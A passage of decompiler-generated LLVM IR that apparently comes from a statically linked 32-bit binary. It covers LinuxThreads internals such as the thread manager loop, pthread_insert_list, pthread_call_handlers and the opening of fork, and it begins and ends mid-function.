  store i32 %v5_8056445, i32* %eax.global-to-local, align 4
  %v0_805644a = load i32, i32* @esp, align 4
  %v1_805644a = add i32 %v0_805644a, 16
  br label %dec_label_pc_805644d

dec_label_pc_805644d:                             ; preds = %dec_label_pc_8056410.dec_label_pc_805644d_crit_edge, %dec_label_pc_8056431
  %v0_805644d = phi i32 [ %v0_805644d.pre, %dec_label_pc_8056410.dec_label_pc_805644d_crit_edge ], [ %v1_805644a, %dec_label_pc_8056431 ]
  %v1_805644d = add i32 %v0_805644d, 20
  %v2_805644d = inttoptr i32 %v1_805644d to i32*
  %v3_805644d = load i32, i32* %v2_805644d, align 4
  %v2_8056451 = mul i32 %v3_805644d, 16
  store i32 %v2_8056451, i32* %eax.global-to-local, align 4
  %v1_8056454 = add i32 %v2_8056451, 134674600
  %v2_8056454 = inttoptr i32 %v1_8056454 to i32*
  store i32 0, i32* %v2_8056454, align 8
  %v0_805645e = load i32, i32* %eax.global-to-local, align 4
  %v1_805645e = add i32 %v0_805645e, 134674604
  %v2_805645e = inttoptr i32 %v1_805645e to i32*
  store i32 0, i32* %v2_805645e, align 4
  %v0_8056468 = load i32, i32* @global_var_80738a0.666, align 32
  %v1_805646d = add i32 %v0_8056468, -1
  store i32 %v1_805646d, i32* %eax.global-to-local, align 4
  store i32 %v1_805646d, i32* @global_var_80738a0.666, align 32
  %v1_8056473 = call i32 @__errno_location(i32 %arg1)
  store i32 %v1_8056473, i32* %eax.global-to-local, align 4
  %v1_8056478 = inttoptr i32 %v1_8056473 to i32*
  %v2_8056478 = load i32, i32* %v1_8056478, align 4
  store i32 %v2_8056478, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8056493

dec_label_pc_805647c:                             ; preds = %dec_label_pc_80561ff, %dec_label_pc_80560f6
  store i32 11, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8056493

dec_label_pc_8056483:                             ; preds = %dec_label_pc_80563f6
  %v2_8056483 = add i32 %v1_8056483, 20
  %v3_8056483 = inttoptr i32 %v2_8056483 to i32*
  store i32 %v0_8056483, i32* %v3_8056483, align 4
  %v0_8056486 = load i32, i32* @esp, align 4
  %v1_8056486 = add i32 %v0_8056486, 4
  %v2_8056486 = inttoptr i32 %v1_8056486 to i32*
  %v3_8056486 = load i32, i32* %v2_8056486, align 4
  store i32 %v3_8056486, i32* %eax.global-to-local, align 4
  %v1_805648a = add i32 %v0_8056486, 16
  %v2_805648a = inttoptr i32 %v1_805648a to i32*
  %v3_805648a = load i32, i32* %v2_805648a, align 4
  %v2_805648e = add i32 %v3_8056486, 48
  %v3_805648e = inttoptr i32 %v2_805648e to i32*
  store i32 %v3_805648a, i32* %v3_805648e, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8056493

dec_label_pc_8056493:                             ; preds = %dec_label_pc_80560e4, %dec_label_pc_805647c, %dec_label_pc_805644d, %dec_label_pc_8056483
  %v0_8056497 = phi i32 [ 1, %dec_label_pc_80560e4 ], [ 11, %dec_label_pc_805647c ], [ %v2_8056478, %dec_label_pc_805644d ], [ 0, %dec_label_pc_8056483 ]
  %v0_8056493 = load i32, i32* @esp, align 4
  %v1_8056493 = add i32 %v0_8056493, 4
  %v2_8056493 = inttoptr i32 %v1_8056493 to i32*
  %v3_8056493 = load i32, i32* %v2_8056493, align 4
  store i32 %v3_8056493, i32* %ecx.global-to-local, align 4
  %v2_8056497 = add i32 %v3_8056493, 52
  %v3_8056497 = inttoptr i32 %v2_8056497 to i32*
  store i32 %v0_8056497, i32* %v3_8056497, align 4
  %v0_805649a = load i32, i32* @esp, align 4
  %v1_805649a = add i32 %v0_805649a, 48
  %v2_805649a = inttoptr i32 %v1_805649a to i32*
  %storemerge.pre = load i32, i32* %v2_805649a, align 4
  br label %dec_label_pc_805657b

dec_label_pc_80564a3:                             ; preds = %dec_label_pc_805607a
  %v1_80564a3 = add i32 %v0_8056091, 72
  %v2_80564a3 = inttoptr i32 %v1_80564a3 to i32*
  %v3_80564a3 = load i32, i32* %v2_80564a3, align 4
  store i32 %v3_80564a3, i32* @edi, align 4
  store i32 0, i32* @edx, align 4
  %v1_80564ab = urem i32 %v3_80564a3, 1024
  %v2_80564b0 = mul nuw nsw i32 %v1_80564ab, 16
  %v1_80564b3 = add nuw nsw i32 %v2_80564b0, 134674592
  store i32 %v1_80564b3, i32* @esi, align 4
  store i32 %v1_80564b3, i32* @eax, align 4
  %v1_80564bb = call i32 @__pthread_lock(i32 %arg1)
  store i32 %v1_80564bb, i32* %eax.global-to-local, align 4
  %v0_80564c0 = load i32, i32* @esi, align 4
  %v1_80564c0 = add i32 %v0_80564c0, 8
  %v2_80564c0 = inttoptr i32 %v1_80564c0 to i32*
  %v3_80564c0 = load i32, i32* %v2_80564c0, align 4
  store i32 %v3_80564c0, i32* @ebx, align 4
  %v1_80564c3 = icmp eq i32 %v3_80564c0, 0
  br i1 %v1_80564c3, label %dec_label_pc_80564eb, label %dec_label_pc_80564c7

dec_label_pc_80564c7:                             ; preds = %dec_label_pc_80564a3
  %v1_80564c7 = add i32 %v3_80564c0, 16
  %v2_80564c7 = inttoptr i32 %v1_80564c7 to i32*
  %v3_80564c7 = load i32, i32* %v2_80564c7, align 4
  %v4_80564c7 = load i32, i32* @edi, align 4
  %v15_80564c7 = icmp eq i32 %v3_80564c7, %v4_80564c7
  %v1_80564ca = icmp eq i1 %v15_80564c7, false
  br i1 %v1_80564ca, label %dec_label_pc_80564eb, label %dec_label_pc_80564cc

dec_label_pc_80564cc:                             ; preds = %dec_label_pc_80564c7
  %v1_80564cc = add i32 %v3_80564c0, 46
  %v2_80564cc = inttoptr i32 %v1_80564cc to i8*
  %v3_80564cc = load i8, i8* %v2_80564cc, align 1
  %v4_80564cc = icmp eq i8 %v3_80564cc, 0
  br i1 %v4_80564cc, label %dec_label_pc_80564e7, label %dec_label_pc_80564d2

dec_label_pc_80564d2:                             ; preds = %dec_label_pc_80564cc
  %v0_80564d2 = load i32, i32* @esp, align 4
  %v2_80564d5 = add i32 %v0_80564d2, -16
  %v3_80564d5 = inttoptr i32 %v2_80564d5 to i32*
  store i32 %v0_80564c0, i32* %v3_80564d5, align 4
  %v2_80564d6 = call i32 @__pthread_unlock(i32* %v1_80564ef)
  %v0_80564db = load i32, i32* @ebx, align 4
  store i32 %v0_80564db, i32* @eax, align 4
  %v0_80564dd = call i32 @pthread_free()
  store i32 %v0_80564dd, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80565b6

dec_label_pc_80564e7:                             ; preds = %dec_label_pc_80564cc
  %v1_80564e7 = add i32 %v3_80564c0, 45
  %v2_80564e7 = inttoptr i32 %v1_80564e7 to i8*
  store i8 1, i8* %v2_80564e7, align 1
  %v0_80564ee.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80564eb

dec_label_pc_80564eb:                             ; preds = %dec_label_pc_80564c7, %dec_label_pc_80564a3, %dec_label_pc_80564e7
  %v0_80564ee = phi i32 [ %v0_80564c0, %dec_label_pc_80564c7 ], [ %v0_80564c0, %dec_label_pc_80564a3 ], [ %v0_80564ee.pre, %dec_label_pc_80564e7 ]
  %v0_80564eb = load i32, i32* @esp, align 4
  %v2_80564ee = add i32 %v0_80564eb, -16
  %v3_80564ee = inttoptr i32 %v2_80564ee to i32*
  store i32 %v0_80564ee, i32* %v3_80564ee, align 4
  %v2_80564ef = call i32 @__pthread_unlock(i32* %v1_80564ef)
  store i32 %v2_80564ef, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80565b6

dec_label_pc_80564f9:                             ; preds = %dec_label_pc_805607a
  %v1_80564f9 = add i32 %v0_8056091, 64
  %v2_80564f9 = inttoptr i32 %v1_80564f9 to i32*
  %v3_80564f9 = load i32, i32* %v2_80564f9, align 4
  store i32 %v3_80564f9, i32* @ebx, align 4
  %v1_80564fd = add i32 %v0_8056091, 72
  %v2_80564fd = inttoptr i32 %v1_80564fd to i32*
  %v3_80564fd = load i32, i32* %v2_80564fd, align 4
  store i32 %v3_80564fd, i32* %eax.global-to-local, align 4
  store i32 1, i32* @global_var_807a62c.675, align 4
  store i32 %v3_80564fd, i32* @global_var_807a630.676, align 16
  %v1_8056510 = inttoptr i32 %v3_80564f9 to i32*
  %v2_8056510 = load i32, i32* %v1_8056510, align 4
  store i32 %v2_8056510, i32* @esi, align 4
  %v12_805652976 = icmp eq i32 %v2_8056510, %v3_80564f9
  %v1_805652b77 = icmp eq i1 %v12_805652976, false
  br i1 %v1_805652b77, label %dec_label_pc_8056514, label %dec_label_pc_805652d

dec_label_pc_8056514:                             ; preds = %dec_label_pc_80564f9, %dec_label_pc_8056514
  %v1_805651478 = phi i32 [ %v1_8056526, %dec_label_pc_8056514 ], [ %v1_8056091, %dec_label_pc_80564f9 ]
  %v0_8056514 = load i32, i32* @ebp, align 4
  %v2_8056514 = add i32 %v1_805651478, -4
  %v3_8056514 = inttoptr i32 %v2_8056514 to i32*
  store i32 %v0_8056514, i32* %v3_8056514, align 4
  %v0_8056515 = load i32, i32* @ebp, align 4
  %v2_8056515 = add i32 %v1_805651478, -8
  %v3_8056515 = inttoptr i32 %v2_8056515 to i32*
  store i32 %v0_8056515, i32* %v3_8056515, align 4
  %v0_8056516 = load i32, i32* @global_var_8073c8c.671, align 4
  %v2_8056516 = add i32 %v1_805651478, -12
  %v3_8056516 = inttoptr i32 %v2_8056516 to i32*
  store i32 %v0_8056516, i32* %v3_8056516, align 4
  %v0_805651c = load i32, i32* @esi, align 4
  %v1_805651c = add i32 %v0_805651c, 20
  %v2_805651c = inttoptr i32 %v1_805651c to i32*
  %v3_805651c = load i32, i32* %v2_805651c, align 4
  %v5_805651c = add i32 %v1_805651478, -16
  %v6_805651c = inttoptr i32 %v5_805651c to i32*
  store i32 %v3_805651c, i32* %v6_805651c, align 4
  %v3_805651f = call i32 @kill(i32 %arg1, i32 1)
  store i32 %v3_805651f, i32* %eax.global-to-local, align 4
  %v0_8056524 = load i32, i32* @esi, align 4
  %v1_8056524 = inttoptr i32 %v0_8056524 to i32*
  %v2_8056524 = load i32, i32* %v1_8056524, align 4
  store i32 %v2_8056524, i32* @esi, align 4
  %v0_8056526 = load i32, i32* @esp, align 4
  %v1_8056526 = add i32 %v0_8056526, 16
  %v1_8056529.pre = load i32, i32* @ebx, align 4
  %v12_8056529 = icmp eq i32 %v2_8056524, %v1_8056529.pre
  %v1_805652b = icmp eq i1 %v12_8056529, false
  br i1 %v1_805652b, label %dec_label_pc_8056514, label %dec_label_pc_805652d

dec_label_pc_805652d:                             ; preds = %dec_label_pc_8056514, %dec_label_pc_80564f9
  %v1_8056514.lcssa = phi i32 [ %v1_8056091, %dec_label_pc_80564f9 ], [ %v1_8056526, %dec_label_pc_8056514 ]
  %v0_805652d.lcssa = phi i32 [ %v2_8056510, %dec_label_pc_80564f9 ], [ %v2_8056524, %dec_label_pc_8056514 ]
  %v1_805652d = inttoptr i32 %v0_805652d.lcssa to i32*
  %v2_805652d = load i32, i32* %v1_805652d, align 4
  store i32 %v2_805652d, i32* @ebx, align 4
  %v12_805654667 = icmp eq i32 %v2_805652d, %v0_805652d.lcssa
  %v1_805654868 = icmp eq i1 %v12_805654667, false
  br i1 %v1_805654868, label %dec_label_pc_8056531, label %dec_label_pc_805654a

dec_label_pc_8056531:                             ; preds = %dec_label_pc_805652d, %dec_label_pc_8056531
  %v1_805653169 = phi i32 [ %v1_8056543, %dec_label_pc_8056531 ], [ %v1_8056514.lcssa, %dec_label_pc_805652d ]
  %v0_8056531 = load i32, i32* @edi, align 4
  %v2_8056531 = add i32 %v1_805653169, -4
  %v3_8056531 = inttoptr i32 %v2_8056531 to i32*
  store i32 %v0_8056531, i32* %v3_8056531, align 4
  %v1_8056532 = add i32 %v1_805653169, -8
  %v2_8056532 = inttoptr i32 %v1_8056532 to i32*
  store i32 -2147483648, i32* %v2_8056532, align 4
  %v1_8056537 = add i32 %v1_805653169, -12
  %v2_8056537 = inttoptr i32 %v1_8056537 to i32*
  store i32 0, i32* %v2_8056537, align 4
  %v0_8056539 = load i32, i32* @ebx, align 4
  %v1_8056539 = add i32 %v0_8056539, 20
  %v2_8056539 = inttoptr i32 %v1_8056539 to i32*
  %v3_8056539 = load i32, i32* %v2_8056539, align 4
  %v5_8056539 = add i32 %v1_805653169, -16
  %v6_8056539 = inttoptr i32 %v5_8056539 to i32*
  store i32 %v3_8056539, i32* %v6_8056539, align 4
  %v2_805653c = load i32, i32* %stack_var_-16, align 4
  %v5_805653c = call i32 @waitpid(i32 %arg1, i32 1, i32 %v2_805653c, i32 %v0_8055f5f)
  store i32 %v5_805653c, i32* %eax.global-to-local, align 4
  %v0_8056541 = load i32, i32* @ebx, align 4
  %v1_8056541 = inttoptr i32 %v0_8056541 to i32*
  %v2_8056541 = load i32, i32* %v1_8056541, align 4
  store i32 %v2_8056541, i32* @ebx, align 4
  %v0_8056543 = load i32, i32* @esp, align 4
  %v1_8056543 = add i32 %v0_8056543, 16
  %v1_8056546.pre = load i32, i32* @esi, align 4
  %v12_8056546 = icmp eq i32 %v2_8056541, %v1_8056546.pre
  %v1_8056548 = icmp eq i1 %v12_8056546, false
  br i1 %v1_8056548, label %dec_label_pc_8056531, label %dec_label_pc_805654a

dec_label_pc_805654a:                             ; preds = %dec_label_pc_8056531, %dec_label_pc_805652d
  %v0_805654a.lcssa = phi i32 [ %v2_805652d, %dec_label_pc_805652d ], [ %v2_8056541, %dec_label_pc_8056531 ]
  store i32 %v0_805654a.lcssa, i32* @eax, align 4
  %v0_805654c = call i32 @restart()
  br label %dec_label_pc_8056551

dec_label_pc_8056551:                             ; preds = %dec_label_pc_8056047, %dec_label_pc_805654a
  %storemerge1 = phi i32 [ %v0_805654c, %dec_label_pc_805654a ], [ %v0_805604b, %dec_label_pc_8056047 ]
  store i32 %storemerge1, i32* %eax.global-to-local, align 4
  %v0_8056551 = load i32, i32* @esp, align 4
  %v1_8056554 = add i32 %v0_8056551, -16
  %v2_8056554 = inttoptr i32 %v1_8056554 to i32*
  store i32 0, i32* %v2_8056554, align 4
  %v1_8056556 = call i32 @__GI__exit(i32 %arg1)
  unreachable

dec_label_pc_805655b:                             ; preds = %dec_label_pc_805607a
  store i32 1, i32* @global_var_80784a4.663, align 4
  %v0_8056565 = call i32 @pthread_reap_children()
  %v0_805656a = load i32, i32* bitcast (i32** @global_var_8073c80.657 to i32*), align 128
  store i32 %v0_805656a, i32* %eax.global-to-local, align 4
  store i32 %v0_805656a, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805657b

dec_label_pc_805657b:                             ; preds = %dec_label_pc_8056493, %dec_label_pc_805655b
  %storemerge = phi i32 [ %v0_805656a, %dec_label_pc_805655b ], [ %storemerge.pre, %dec_label_pc_8056493 ]
  store i32 %storemerge, i32* @eax, align 4
  %v0_805657b = call i32 @restart()
  store i32 %v0_805657b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8056023thread-pre-split

dec_label_pc_8056585:                             ; preds = %dec_label_pc_805607a
  %v1_8056588 = add i32 %v0_8056091, 72
  %v2_8056588 = inttoptr i32 %v1_8056588 to i32*
  %v3_8056588 = load i32, i32* %v2_8056588, align 4
  %v6_8056588 = inttoptr i32 %v0_8056091 to i32*
  store i32 %v3_8056588, i32* %v6_8056588, align 4
  %v0_805658c = call i32 @__new_sem_post()
  store i32 %v0_805658c, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80565b6

dec_label_pc_80565b6:                             ; preds = %dec_label_pc_8056585, %dec_label_pc_80564eb, %dec_label_pc_80564d2
  %v0_80565b6 = load i32, i32* @esp, align 4
  %v1_80565b6 = add i32 %v0_80565b6, 16
  br label %dec_label_pc_8056023

; uselistorder directives
  uselistorder i32 %v2_8056541, { 1, 0, 2 }
  uselistorder i32 %v2_805652d, { 1, 0, 2 }
  uselistorder i32 %v2_8056524, { 1, 0, 2 }
  uselistorder i32 %v2_8056510, { 1, 0, 2 }
  uselistorder i32 %v2_8056451, { 1, 0 }
  uselistorder i32 %v1_8056483, { 2, 1, 0 }
  uselistorder i32 %v0_8056483, { 1, 0 }
  uselistorder i32 %v12_80563e2, { 1, 0 }
  uselistorder i32 %v0_80563ac, { 1, 0 }
  uselistorder i32 %v5_805639d, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_80562c8, { 1, 0 }
  uselistorder i32 %v1_8056208, { 3, 2, 1, 0 }
  uselistorder i32 %v3_80560fe, { 1, 0 }
  uselistorder i32 %v0_80560fe, { 1, 0 }
  uselistorder i32 %v1_80561b1, { 1, 0 }
  uselistorder i32 %v2_8056191, { 1, 0 }
  uselistorder i32 %v1_8056183, { 0, 1, 2, 3, 4, 5, 7, 6, 8 }
  uselistorder i32 %tmp49, { 2, 1, 0, 3 }
  uselistorder i32 %v0_8056162, { 1, 0, 2 }
  uselistorder i32 %v2_8056110, { 1, 0 }
  uselistorder i32 %v0_80560fe90, { 2, 0, 1 }
  uselistorder i32 %v0_80560bc, { 1, 0, 2 }
  uselistorder i32 %v1_8056091, { 1, 2, 0 }
  uselistorder i32 %v0_8056091, { 7, 6, 3, 4, 5, 0, 1, 2, 8, 9 }
  uselistorder i32 %v0_8056070, { 5, 4, 3, 2, 1, 0, 6 }
  uselistorder i32 %v1_805606d, { 1, 0 }
  uselistorder i32 %v1_8056023, { 5, 4, 3, 2, 1, 0 }
  uselistorder i16* %v4_8056336, { 1, 0 }
  uselistorder i32* %v1_80564ef, { 2, 1, 0 }
  uselistorder i32 %v2_8055f7b, { 3, 2, 1, 5, 4, 0, 7, 6, 9, 8, 10 }
  uselistorder i32 %v0_8055f5f, { 2, 0, 1, 3, 4, 7, 5, 6 }
  uselistorder i32* %stack_var_-16, { 10, 12, 11, 9, 8, 2, 3, 1, 0, 7, 6, 4, 5, 13 }
  uselistorder i32* %edx.global-to-local, { 19, 0, 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 20 }
  uselistorder i32* %eax.global-to-local, { 0, 70, 71, 91, 1, 2, 3, 4, 5, 6, 7, 9, 8, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 92, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 73, 68, 69, 93, 94, 95, 72, 74, 76, 75, 77, 78, 79, 81, 80, 82, 83, 85, 84, 86, 87, 88, 89, 90 }
  uselistorder i32 ()* @restart, { 1, 2, 0 }
  uselistorder i32 ()* @pthread_free, { 1, 0 }
  uselistorder i32 ()* @pthread_reap_children, { 1, 0 }
  uselistorder i32* @global_var_80784a0.662, { 1, 2, 3, 0, 4 }
  uselistorder i32 %arg1, { 16, 17, 18, 15, 6, 7, 5, 8, 3, 4, 9, 1, 2, 0, 12, 13, 19, 20, 10, 11, 14, 21, 24, 23, 22 }
  uselistorder label %dec_label_pc_805657b, { 1, 0 }
  uselistorder label %dec_label_pc_8056551, { 1, 0 }
  uselistorder label %dec_label_pc_8056531, { 1, 0 }
  uselistorder label %dec_label_pc_8056514, { 1, 0 }
  uselistorder label %dec_label_pc_80564eb, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8056493, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_805644d, { 1, 0 }
  uselistorder label %dec_label_pc_8056431, { 1, 0 }
  uselistorder label %dec_label_pc_80563f6, { 1, 0 }
  uselistorder label %dec_label_pc_80563d8, { 1, 0 }
  uselistorder label %dec_label_pc_8056319, { 1, 0 }
  uselistorder label %dec_label_pc_8056310, { 1, 0 }
  uselistorder label %dec_label_pc_805630d, { 1, 0 }
  uselistorder label %dec_label_pc_8056208, { 1, 0 }
  uselistorder label %dec_label_pc_805617b, { 1, 0 }
  uselistorder label %dec_label_pc_8056177, { 1, 0 }
  uselistorder label %dec_label_pc_805610c, { 1, 0 }
  uselistorder label %dec_label_pc_805606d, { 1, 0 }
  uselistorder label %dec_label_pc_8056023, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8056023thread-pre-split, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_8055fc1, { 2, 0, 1 }
}

define i32 @__pthread_manager_event(i32 %arg1) local_unnamed_addr {
entry:
  store i32 0, i32* @edx, align 4
  %v0_80565c3 = load i32, i32* bitcast (i32** @global_var_8073abc.678 to i32*), align 4
  store i32 %v0_80565c3, i32* @eax, align 4
  %v1_80565c8 = call i32 @__pthread_lock(i32 ptrtoint (i32* @0 to i32))
  %v0_80565d0 = load i32, i32* bitcast (i32** @global_var_8073abc.678 to i32*), align 4
  %v1_80565d6 = inttoptr i32 %v0_80565d0 to i32*
  %v2_80565d6 = call i32 @__pthread_unlock(i32* %v1_80565d6)
  %v1_80565e0 = call i32 @__pthread_manager(i32 %arg1)
  ret i32 %v1_80565e0
}

define i32 @pthread_insert_list(i32 %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80565e8 = load i32, i32* @ebx, align 4
  store i32 %v0_80565e8, i32* %stack_var_-4, align 4
  %v0_80565e9 = load i32, i32* @edx, align 4
  %v1_80565e9 = icmp eq i32 %v0_80565e9, 0
  %v0_80565eb = load i32, i32* @eax, align 4
  store i32 %v0_80565eb, i32* %ebx.global-to-local, align 4
  br i1 %v1_80565e9, label %dec_label_pc_805660a, label %dec_label_pc_80565ef

dec_label_pc_80565ef:                             ; preds = %entry
  %v4_80565ef = icmp eq i32 %arg1, 0
  %v1_80565f4 = icmp eq i1 %v4_80565ef, false
  br i1 %v1_80565f4, label %dec_label_pc_80565fb.preheader, label %dec_label_pc_8056601

dec_label_pc_80565fb.preheader:                   ; preds = %dec_label_pc_80565ef
  %v1_80565fb2 = inttoptr i32 %v0_80565eb to i32*
  %v2_80565fb3 = load i32, i32* %v1_80565fb2, align 4
  %v1_80565fd4 = icmp eq i32 %v2_80565fb3, 0
  %v1_80565ff11 = icmp eq i1 %v1_80565fd4, false
  br i1 %v1_80565ff11, label %dec_label_pc_80565f8, label %dec_label_pc_8056601

dec_label_pc_80565f8:                             ; preds = %dec_label_pc_80565fb.preheader, %dec_label_pc_80565f8
  %v2_80565fb12 = phi i32 [ %v2_80565fb, %dec_label_pc_80565f8 ], [ %v2_80565fb3, %dec_label_pc_80565fb.preheader ]
  %v1_80565f8 = add i32 %v2_80565fb12, 4
  store i32 %v1_80565f8, i32* %ebx.global-to-local, align 4
  %v1_80565fb = inttoptr i32 %v1_80565f8 to i32*
  %v2_80565fb = load i32, i32* %v1_80565fb, align 4
  %v1_80565fd = icmp eq i32 %v2_80565fb, 0
  %v1_80565ff = icmp eq i1 %v1_80565fd, false
  br i1 %v1_80565ff, label %dec_label_pc_80565f8, label %dec_label_pc_80565fb.dec_label_pc_8056601.loopexit_crit_edge

dec_label_pc_80565fb.dec_label_pc_8056601.loopexit_crit_edge: ; preds = %dec_label_pc_80565f8
  br label %dec_label_pc_8056601

dec_label_pc_8056601:                             ; preds = %dec_label_pc_80565fb.preheader, %dec_label_pc_80565fb.dec_label_pc_8056601.loopexit_crit_edge, %dec_label_pc_80565ef
  %v1_8056601 = load i32, i32* @ecx, align 4
  %v2_8056601 = inttoptr i32 %v1_8056601 to i32*
  store i32 %v0_80565e9, i32* %v2_8056601, align 4
  %v0_8056603 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8056603 = inttoptr i32 %v0_8056603 to i32*
  %v2_8056603 = load i32, i32* %v1_8056603, align 4
  %v1_8056605 = load i32, i32* @ecx, align 4
  %v2_8056605 = add i32 %v1_8056605, 4
  %v3_8056605 = inttoptr i32 %v2_8056605 to i32*
  store i32 %v2_8056603, i32* %v3_8056605, align 4
  %v0_8056608 = load i32, i32* @ecx, align 4
  %v1_8056608 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8056608 = inttoptr i32 %v1_8056608 to i32*
  store i32 %v0_8056608, i32* %v2_8056608, align 4
  %v2_805660a.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_805660a

dec_label_pc_805660a:                             ; preds = %entry, %dec_label_pc_8056601
  %v2_805660a = phi i32 [ %v0_80565e8, %entry ], [ %v2_805660a.pre, %dec_label_pc_8056601 ]
  %.0 = phi i32 [ undef, %entry ], [ %v2_8056603, %dec_label_pc_8056601 ]
  store i32 %v2_805660a, i32* @ebx, align 4
  ret i32 %.0

; uselistorder directives
  uselistorder i32 %v2_80565fb, { 1, 0 }
  uselistorder i32* %ebx.global-to-local, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_805660a, { 1, 0 }
  uselistorder label %dec_label_pc_8056601, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80565f8, { 1, 0 }
}

define i32 @pthread_call_handlers() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %tmp16 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp16, i32* %stack_var_-12, align 4
  %v0_805660d = load i32, i32* @eax, align 4
  store i32 %v0_805660d, i32* %ebx.global-to-local, align 4
  %v1_80566192 = icmp eq i32 %v0_805660d, 0
  %v1_805661b9 = icmp eq i1 %v1_80566192, false
  br i1 %v1_805661b9, label %dec_label_pc_8056614.lr.ph, label %dec_label_pc_805661d

dec_label_pc_8056614.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_8056614

dec_label_pc_8056614:                             ; preds = %dec_label_pc_8056614.lr.ph, %dec_label_pc_8056614
  %v4_8056614 = phi i32 [ %v0_805660d, %dec_label_pc_8056614.lr.ph ], [ %v3_8056616, %dec_label_pc_8056614 ]
  %v5_8056614 = inttoptr i32 %v4_8056614 to i32*
  %v6_8056614 = load i32, i32* %v5_8056614, align 4
  call void @__pseudo_call(i32 %v6_8056614)
  %v0_8056616 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8056616 = add i32 %v0_8056616, 4
  %v2_8056616 = inttoptr i32 %v1_8056616 to i32*
  %v3_8056616 = load i32, i32* %v2_8056616, align 4
  store i32 %v3_8056616, i32* %ebx.global-to-local, align 4
  %v1_8056619 = icmp eq i32 %v3_8056616, 0
  %v1_805661b = icmp eq i1 %v1_8056619, false
  br i1 %v1_805661b, label %dec_label_pc_8056614, label %dec_label_pc_8056619.dec_label_pc_805661d_crit_edge

dec_label_pc_8056619.dec_label_pc_805661d_crit_edge: ; preds = %dec_label_pc_8056614
  %v2_805661d.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_805661d

dec_label_pc_805661d:                             ; preds = %dec_label_pc_8056619.dec_label_pc_805661d_crit_edge, %entry
  %v2_805661d = phi i32 [ %v2_805661d.pre, %dec_label_pc_8056619.dec_label_pc_805661d_crit_edge ], [ %tmp16, %entry ]
  ret i32 %v2_805661d

; uselistorder directives
  uselistorder i32 %v3_8056616, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8056614, { 1, 0 }
}

define i32 @fork(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8056621 = load i32, i32* @ebp, align 4
  %v0_8056622 = load i32, i32* @edi, align 4
  %v0_8056623 = load i32, i32* @esi, align 4
  %v0_8056624 = load i32, i32* @ebx, align 4
  store i32 %v0_8056624, i32* %stack_var_-16, align 4
  %v1_805662d = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_80784ac.679 to i32))
  %v0_8056632 = load i32, i32* @global_var_80784c4.680, align 4
  store i32 %v0_8056632, i32* @eax, align 4
  %v0_8056637 = load i32, i32* @global_var_80784c8.681, align 8
  store i32 %v0_8056637, i32* @ebp, align 4
  %v0_805663d = load i32, i32* @global_var_80784cc.682, align 4
  store i32 %v0_805663d, i32* @ebx, align 4
  %v0_8056643 = call i32 @pthread_call_handlers()
  %v0_8056648 = call i32 @__pthread_once_fork_prepare()
  %v1_8056654 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8073eb0.683 to i32))
  %v0_8056659 = call i32 @__libc_fork()
  store i32 %v0_8056659, i32* @edi, align 4
  %v1_8056663 = icmp eq i32 %v0_8056659, 0
  %v1_8056665 = icmp eq i1 %v1_8056663, false
  br i1 %v1_8056665, label %dec_label_pc_80566e6, label %dec_label_pc_8056667

dec_label_pc_8056667:                             ; preds = %entry
  %v2_8056673 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_8056673, i32* @ebx, align 4
  %v2_8056678 = call i32 @pthread_mutexattr_init(i32* nonnull %stack_var_-20)
  %v3_8056682 = call i32 @__pthread_mutexattr_setkind_np(i32* nonnull %stack_var_-20, i32 1)
  %v3_805668f = call i32 @pthread_mutex_init(i32 ptrtoint (i32* @global_var_8073eb0.683 to i32), i32* nonnull %stack_var_-20)
  %v1_8056697 = call i32 @pthread_mutexattr_destroy(i32 %v2_8056673)
  %v2_80566a7 = call i32 @pthread_mutexattr_init(i32* nonnull %stack_var_-20)
  %v3_80566b1 = call i32 @__pthread_mutexattr_setkind_np(i32* nonnull %stack_var_-20, i32 0)
  store i32 0, i32* @esi, align 4
  %v3_80566be = call i32 @pthread_mutex_init(i32 ptrtoint (i32* @global_var_80784ac.679 to i32), i32* nonnull %stack_var_-20)
  %v1_80566c6 = call i32 @pthread_mutexattr_destroy(i32 %v2_8056673)
  %v0_80566ce = call i32 @__pthread_reset_main_thread()
  %v0_80566d3 = call i32 @__fresetlockfiles()
  %v0_80566d8 = call i32 @__pthread_once_fork_child()
  %v0_80566dd = load i32, i32* @ebp, align 4
  store i32 %v0_80566dd, i32* @eax, align 4
